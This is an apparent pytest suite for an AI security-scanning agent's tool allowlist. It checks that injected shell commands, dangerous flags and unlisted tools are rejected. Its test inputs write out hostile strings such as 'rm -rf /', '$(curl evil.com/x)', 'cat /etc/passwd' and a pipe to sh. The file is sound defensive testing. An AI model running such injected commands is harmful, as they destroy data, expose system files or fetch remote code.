"""Safety spec tests for the tool allowlist + argument policy (toolCatalog).

These are the proof that the agent cannot smuggle a dangerous command past the
first gate: unknown tools, unknown/dangerous flags, shell metacharacters, and
destructive tokens must all be rejected, and targets must be extractable for
the scope check.
"""
from __future__ import annotations

import pytest

from argus.agent.toolCatalog import ALLOWED_TOOLS, extractTargets, isAllowedTool, validateArgs


def test_allowlist_membership():
    assert isAllowedTool("nmap")
    assert isAllowedTool("httpx")
    assert not isAllowedTool("bash")
    assert not isAllowedTool("python")
    assert not isAllowedTool("")


@pytest.mark.parametrize("tool_id,args", [
    ("nmap", ["-sV", "-p", "80,443", "example.com"]),
    ("httpx", ["-u", "https://example.com", "-json", "-silent"]),
    ("curl", ["-s", "-i", "-X", "GET", "https://example.com/api"]),
    ("nuclei", ["-u", "https://example.com", "-severity", "high", "-silent"]),
    ("dig", ["+short", "example.com"]),
    ("gobuster", ["dir", "-u", "https://example.com", "-w", "list.txt"]),
])
def test_valid_commands_pass(tool_id, args):
    ok, reason = validateArgs(tool_id, args)
    assert ok, reason


def test_unknown_tool_rejected():
    ok, reason = validateArgs("bash", ["-c", "echo hi"])
    assert not ok
    assert "allowlist" in reason


@pytest.mark.parametrize("arg", [
    "example.com; rm -rf /",
    "$(curl evil.com/x)",
    "example.com`whoami`",
    "example.com && cat /etc/passwd",
    "http://x/|sh",
    "-oN /tmp/out > /etc/crontab",
    "target\nrm -rf ~/",
])
def test_metacharacter_and_injection_args_rejected(arg):
    ok, reason = validateArgs("nmap", [arg])
    assert not ok


@pytest.mark.parametrize("tool_id,args", [
    ("nmap", ["--script", "http-shellshock", "example.com"]),  # --script not allowed
    ("curl", ["-o", "/tmp/x", "https://example.com"]),          # output-file flag not allowed
    ("nuclei", ["-i", "targets.txt"]),                           # unknown flag
    ("sqlmap", ["-u", "https://example.com"]),                   # sqlmap not in allowlist at all
])
def test_dangerous_or_unknown_flags_rejected(tool_id, args):
    ok, reason = validateArgs(tool_id, args)
    assert not ok


def test_destructive_token_rejected_even_with_allowed_flag():
    ok, reason = validateArgs("curl", ["-H", "X: $(rm -rf /)", "https://example.com"])
    assert not ok


def test_bare_nontarget_positional_rejected():
    # a stray positional that is neither a subcommand nor a target
    ok, reason = validateArgs("nmap", ["notatarget_random_token"])
    assert not ok


def test_extract_targets_skips_flags_and_values():
    targets = extractTargets("nmap", ["-sV", "-p", "80,443", "example.com"])
    assert targets == ["example.com"]  # "80,443" is a value of -p, not a target


def test_extract_targets_includes_value_flag_target():
    # the actual target is the value of -u (a value flag); it MUST still be
    # extracted for the scope check, not skipped as an option value.
    assert extractTargets("httpx", ["-u", "https://example.com", "-json"]) == ["https://example.com"]
    assert extractTargets("nuclei", ["-u", "https://example.com", "-severity", "high"]) == ["https://example.com"]


def test_extract_targets_multiple_and_urls():
    targets = extractTargets("curl", ["-X", "POST", "https://a.example.com/x"])
    assert targets == ["https://a.example.com/x"]  # "POST" is the -X value, skipped
    targets2 = extractTargets("nmap", ["10.0.0.1", "example.com"])
    assert targets2 == ["10.0.0.1", "example.com"]


def test_every_tool_spec_value_flags_subset_of_allowed():
    # invariant: a value-flag must itself be an allowed flag
    for spec in ALLOWED_TOOLS.values():
        assert spec.value_flags <= spec.allowed_flags, spec.tool_id
